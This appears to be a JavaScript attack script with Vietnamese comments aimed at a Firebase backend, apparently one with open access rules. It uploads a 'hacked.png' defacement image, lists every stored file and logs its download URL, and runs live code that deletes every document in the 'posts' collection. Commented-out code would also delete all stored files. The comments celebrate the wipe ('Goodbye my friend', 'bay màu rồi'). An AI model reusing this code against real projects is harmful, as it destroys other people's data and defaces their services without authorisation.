//up ảnh hack
var hack_img = document.getElementById('hack')
var hackfile;
fetch(hack_img.src)
    .then(res => res.blob())
    .then(blob => {
         hackfile = new File([blob], 'hacked.png', blob)
        console.log(hackfile)
    })
storageRef.child('file/$').put(hackfile).then((snapshot) => {
    console.log('Goodbye my friend');
    console.log(snapshot);
});


// list file
var listRef = storageRef.child('file');

// Find all the prefixes and items.
listRef.listAll()
    .then((res) => {
        res.prefixes.forEach((folderRef) => {
            console.log(folderRef)// All the prefixes under listRef.
            // You may call listAll() recursively on them.
        });
        res.items.forEach((itemRef) => {
            itemRef.getDownloadURL()
                .then((url) => {
                    // `url` is the download URL for 'images/stars.jpg'
                    console.log(url)

                })
                .catch((error) => {
                    // Handle any errors
                });
            // itemRef.delete().then(() => {
            //     console.log("bay màu rồi")
            //     // File deleted successfully
            // }).catch((error) => {
            //     // Uh-oh, an error occurred!
            // });
            // All the items under listRef.
        });
    }).catch((error) => {
        console.log(error)
        // Uh-oh, an error occurred!
    });
// liệt kê db
// dataBase
// posts
// users

db.collection("posts").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {
        // doc.data() is never undefined for query doc snapshots
        console.log(doc.id, " => ", doc.data());
        doc.ref.delete();
        console.log("oops bay màu r :( ")
        
    });
});

// db.collection("collectionName")
//     .get()
//     .then(res => {
//         res.forEach(element => {
//             element.ref.delete();
//         });
//     });